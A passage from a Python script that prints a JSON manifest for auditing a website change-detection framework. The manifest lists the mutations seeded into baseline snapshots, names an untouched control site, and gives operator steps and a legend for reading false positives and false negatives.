    # we have a real control; otherwise the audit is partial.
    control_site_id: str | None = None
    if intended_control_idx < len(sites):
        control_site_id = sites[intended_control_idx].name

    # Sites the manifest actually mutated (unique, ordered numerically).
    sites_with_mutations = sorted(
        {m.site_id for m in mutations}, key=lambda s: int(s) if s.isdigit() else 0
    )

    # Bucket counts for the manifest header (operator at-a-glance).
    expected_counts: dict[str, int] = {}
    kind_counts: dict[str, int] = {}
    for m in mutations:
        expected_counts[m.expected] = expected_counts.get(m.expected, 0) + 1
        kind_counts[m.kind] = kind_counts.get(m.kind, 0) + 1

    # Status flag: does the run cover the full plan + a real control?
    if bundles_skipped:
        status = "partial"
    elif control_site_id is None:
        status = "no_control"
    else:
        status = "ok"

    manifest = {
        "status": status,
        "tampered_at": run_dir.parent.name,
        "baseline_run_dir": str(run_dir),
        "mutations_applied": len(mutations),
        "sites_with_mutations": sites_with_mutations,
        "sites_with_mutations_count": len(sites_with_mutations),
        "bundles_in_plan": len(PLAN),
        "bundles_skipped_due_to_missing_sites": [
            {"site_idx": idx, "label": label} for idx, label in bundles_skipped
        ],
        "control_site_id": control_site_id,
        "expected_summary": expected_counts,
        "kind_summary": kind_counts,
        # Preflight (per-site prereq map) lets you see at a glance WHY a
        # mutator skipped (missing markup) vs. WHY a planned-detection
        # is missing (framework gap). expected_skips is the operator's
        # "coverage holes for this site set" view.
        "preflight": preflight,
        "expected_skips_due_to_missing_prereqs": expected_skips,
        "mutations": [asdict(m) for m in mutations],
        # Two distinct kinds of guidance kept separate so the operator
        # doesn't have to pull them apart visually:
        #   - operator_steps: the click sequence to execute
        #   - audit_legend:   how to read each (expected, actual) pair
        #   - control_site:   the framework-correctness invariant
        "next_steps": {
            "operator_steps": [
                "1. /runs → click 'Run current' (NOT 'Run all' - that wipes baseline)",
                "2. After current finishes → click 'Run comparator'",
                "3. After comparator finishes → click 'Run report'",
                "4. Open /reports and audit each site against the mutations below.",
            ],
            "audit_legend": {
                "should_flag → flagged": "✓ correct detection",
                "should_flag → no_changes": "FALSE NEGATIVE (framework bug)",
                "should_not_flag → flagged": "FALSE POSITIVE (framework noise)",
                "should_not_flag → no_changes": "✓ correct (no noise)",
                "edge_case → either": "behavior is a design choice; document it",
            },
            "control_site": (
                f"Site {control_site_id} is the untouched control - MUST "
                "stay no_changes. If it ever flags, environmental noise "
                "(timezone-dependent content, dynamic ads, A/B variants) "
                "is contaminating the audit; fix that first."
                if control_site_id
                else (
                    "NO CONTROL SITE - sites list too short for the plan. "
                    "Audit is partial; re-run baseline to capture the full "
                    "URL set, then re-tamper."
                )
            ),
        },
    }
    print(json.dumps(manifest, indent=2))


if __name__ == "__main__":
    main()
